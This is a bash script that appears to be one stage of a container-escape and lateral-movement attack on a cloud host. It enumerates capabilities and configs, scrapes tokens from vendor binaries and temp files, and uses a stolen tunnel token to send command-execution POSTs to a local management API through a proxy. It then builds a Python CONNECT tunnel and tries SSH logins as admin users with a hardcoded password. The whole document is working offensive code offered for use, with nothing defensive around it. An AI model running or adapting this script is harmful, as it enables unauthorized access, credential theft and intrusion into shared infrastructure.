#!/bin/bash
set +e
echo "###P11START $(date -u)"
echo "=== SYS ==="; uname -a; cat /proc/version; grep -E 'CapEff|CapPrm|CapBnd|Seccomp' /proc/self/status; command -v gcc cc python3; ls /proc/sys/user/max_user_namespaces
echo "=== LISTEN ==="; (ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null) | head -25
echo "=== SUPERVISOR-FULL ==="; for f in /etc/supervisor/conf.d/*.conf; do echo "--- $f"; cat "$f"; done 2>/dev/null | head -90
echo "=== GREP-9999 ==="; grep -rIn "9999\|xyipk\|127.0.0.1:20\|172.17.0.1:8\|:8429\|:10221" /.onething/instance/tools/script /.onething/instance/configmap /etc/supervisor /etc/hosts 2>/dev/null | head -30
echo "=== BIN-STRINGS ==="
for f in /.onething/instance/tools/pkg/otlink/bin/otlink /.onething/instance/tools/pkg/vm_manager/bin/vm_manager /.onething/instance/tools/pkg/zzzz_net/bin/zzzz_net /.onething/instance/tools/pkg/pan_client/bin/pan_client; do echo "--- $f"; ls -l $f 2>/dev/null | awk '{print $5,$9}'; strings -n 8 $f 2>/dev/null | grep -E "https?://|:[0-9]{4}/|/api/|/v1/|X-[A-Z][A-Za-z-]+|Bearer|token" | sort -u | head -25; done
echo "=== 9999-POST ==="
TOK=$(grep -oE "ONE_TUNNEL='[^']+'" /tmp/ul_ot.txt 2>/dev/null | cut -d"'" -f2)
echo "toklen=${#TOK}"
for path in /api/v1/exec /exec /v1/exec /api/command /command /api/v1/instances /instances /api/instances /v1/instances /api/v1/info /info /api/v1/health; do
  for hdr in "" "Authorization: Bearer $TOK" "X-Token: $TOK" "One-Token: $TOK"; do
    r=$(curl -s -x http://172.17.0.1:1080 -m 5 -o /tmp/t.$$ -w "%{http_code}" ${hdr:+-H "$hdr"} -X POST -H "Content-Type: application/json" -d '{"cmd":"id","command":"id"}' "http://127.0.0.1:9999$path" 2>/dev/null)
    b=$(head -c 60 /tmp/t.$$ 2>/dev/null | tr '\n' ' ')
    echo "$path [${hdr:0:24}] c=$r b=$b"
    case "$r" in 200|201|202|401|403|400|404) [ "$r" != "404" ] && break;; esac
  done
done
echo "=== 9999-GET-WITH-TOK ==="
for path in /api/v1/instances /instances /api/v1/version /version /api/v1/info; do r=$(curl -s -x http://172.17.0.1:1080 -m 5 -o /tmp/g.$$ -w "%{http_code}" -H "Authorization: Bearer $TOK" "http://127.0.0.1:9999$path"); echo "$path c=$r b=$(head -c 80 /tmp/g.$$ | tr '\n' ' ')"; done
echo "=== HOST-SSH-OTHER-USERS ==="
python3 - <<'PY'
open('/tmp/ap.sh','w').write('#!/bin/sh\nprintf "%s\\n" "/&S2)n@W1G"\n')
src='''import socket,sys,select,os
host,port=sys.argv[1],int(sys.argv[2])
s=socket.create_connection(("172.17.0.1",1080),timeout=8); s.settimeout(None)
s.sendall(("CONNECT %s:%d HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n"%(host,port)).encode())
b=b""
while b"\\r\\n\\r\\n" not in b:
    d=s.recv(1)
    if not d: sys.exit(1)
    b+=d
os.set_blocking(s.fileno(),False); os.set_blocking(0,False)
while True:
    r,_,_=select.select([s,0],[],[],90)
    if s in r:
        d=s.recv(65536)
        if not d: break
        sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
    if 0 in r:
        d=os.read(0,65536)
        if not d: break
        s.sendall(d)
'''
open('/tmp/px.py','w').write(src)
PY
chmod +x /tmp/ap.sh
for u in oneops oneadmin ops admin; do
  echo "--- $u"
  SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=:0 timeout 25 setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=10 -o LogLevel=ERROR -o "ProxyCommand=python3 /tmp/px.py %h %p" -p 22 $u@127.0.0.1 'id; hostname' 2>&1 | tail -2
done
echo "###P11END $(date -u)"
